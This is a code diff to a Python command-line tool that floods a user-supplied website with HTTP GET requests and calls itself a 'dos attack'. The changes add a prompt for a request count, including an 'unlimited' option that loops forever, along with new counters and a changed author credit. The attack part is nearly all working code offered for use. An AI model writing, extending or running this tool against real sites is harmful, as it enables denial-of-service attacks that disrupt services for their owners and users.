@@ -12,8 +12,8 @@ def main():
     print(colored("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║",'blue'))
     print(colored("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║",'blue'))
     print(colored("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝",'blue'))
-
-    print(colored("| made by: KaMrAn ZoNe |\n", 'green'))
+    print(colored("-------------------------------------------------", 'white',attrs=['blink']))
+    print(colored("| 𝕞𝕒𝕕𝕖 𝕓𝕪 𝕩-𝕥𝕣𝕒.𝕩𝕪𝕫 (𝕖𝕞𝕒𝕟𝕦𝕖𝕝 𝕧𝕚𝕔𝕥𝕠𝕣) |\n", 'green'))
 
 
 main()
@@ -39,38 +39,40 @@ def dos():
           except:
              pass
           return False
-        print (is_connected())
         #------------------------------
         if is_connected : 
-    
-            r = requests.get("http://"+s)
-    
-            print(colored("\nPocket was sent",'red'))
-    
-            r = requests.get("http://"+s)
-    
-            print(colored("Pocket was sent",'blue'))
-    
-            r = requests.get("http://"+s)
-    
-            print(colored("Pocket was sent",'red'))
-    
-            r = requests.get("http://"+s)
-    
-            print(colored("Pocket was sent",'blue'))
     
             c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
     
             if c == 'y':
-                while True:
-                    r = requests.get("http://"+s)
-                    print(colored("Pocket was sent", 'red'))
-                    r = requests.get("http://"+s)
-                    print(colored("Pocket was sent", 'blue'))
+                packet = input(colored("enter your Packet Size\n-------------------\nexample: 100000\n-------------------\nor :Enter \"u\" if you want the Packet to be unlimited \n ~> ",'cyan'))
+                count = 0
+                if packet == "u":
+                    print(colored("The dos attack started :)",'green'))
+                    while True:
+                        r = requests.get("http://"+s)
+                        print(colored(f"Pocket was sent ({count})", 'red'))
+                        count+=1
+                        r = requests.get("http://"+s)
+                        print(colored(f"Pocket was sent ({count})", 'blue'))
+                        count+=1
+                elif int(packet)>=1:
+                    print(colored("The dos attack started :)",'green'))
+                    while count <= int(packet):
+                        r = requests.get("http://"+s)
+                        print(colored(f"Pocket was sent ({count})", 'red'))
+                        count+=1
+                        r = requests.get("http://"+s)
+                        print(colored(f"Pocket was sent ({count})", 'blue'))
+                        count+=1
+                else:
+                    print(colored("Please enter the correct number of packets :(",'red'))            
             elif c == 'n':
                 os.system('clear')
                 main()
                 dos()
+            else:
+                print(colored("Please use the correct character :(",'red'))          
         else:
             print("Please enter a valid site address")
 
